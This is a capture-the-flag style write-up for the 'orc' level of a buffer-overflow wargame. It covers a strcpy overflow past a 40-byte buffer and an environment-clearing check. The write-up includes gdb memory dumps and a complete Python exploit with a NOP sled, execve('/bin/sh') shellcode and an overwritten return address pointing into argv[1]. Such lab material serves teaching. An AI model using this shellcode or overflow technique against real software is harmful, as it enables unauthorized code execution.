# Vulnerability
In `orc.c`, strcpy() copys argv[1] into buffer[40], without boundary check.

Difference from last problem is that `egghunter` is added which reset environment variables and I must use stack address in RET since it check's RET's first byte is '\xbf' or not.
```c
char buffer[40];
// egghunter 
for(i=0; environ[i]; i++)
  memset(environ[i], 0, strlen(environ[i]));

if(argv[1][47] != '\xbf')
{
  printf("stack is still your friend.\n");
  exit(0);
}
strcpy(buffer, argv[1]);
```

# Exploitation
The buffer is smaller than first problem(gate which has 256 bytes) but enough to give NOP(15) + SHELLCODE(25).

```assembly
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %esp,%ebp
0x8048503 <main+3>:	sub    $0x2c,%esp
```

This process uses '\x2c' size but 4 bytes are for 'i' variable.

I will give that on buffer and use RET to buffer's address.

```
----------------------------------------------------------------
| NOP(15) | SHELLCODE[25] | AAAA(4) | RET[buffer's address](4) |
----------------------------------------------------------------
```

So, I made a python file to give payload and got a core dump file.

In core file, the memory is:
```
(gdb) x/32x $esp-48
0xbffffab0:	0x90909090	0x90909090	0x90909090	0x31909090
0xbffffac0:	0x2f6850c0	0x6868732f	0x6e69622f	0x5350e389
0xbffffad0:	0xd231e189	0x80cd0bb0	0x41414141	0xbfbfbfbf
```

But, used this address to return but doesn't work. So, I used argv[1] address instead buffer's address.
```
0xbffffc1c:	0x90909000	0x90909090	0x90909090	0x90909090
0xbffffc2c:	0x6850c031	0x68732f2f	0x69622f68	0x50e3896e
0xbffffc3c:	0x31e18953	0xcd0bb0d2	0x41414180	0xfffab041
```

# Payload
```python
import os
from struct import *

payload = ""
payload = payload + "\x90" * 15
payload = payload + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = payload + "AAAA" # SFP
payload = payload + "\x20\xfc\xff\xbf" # RET

os.execv('/home/goblin/asd', ["", payload])
```
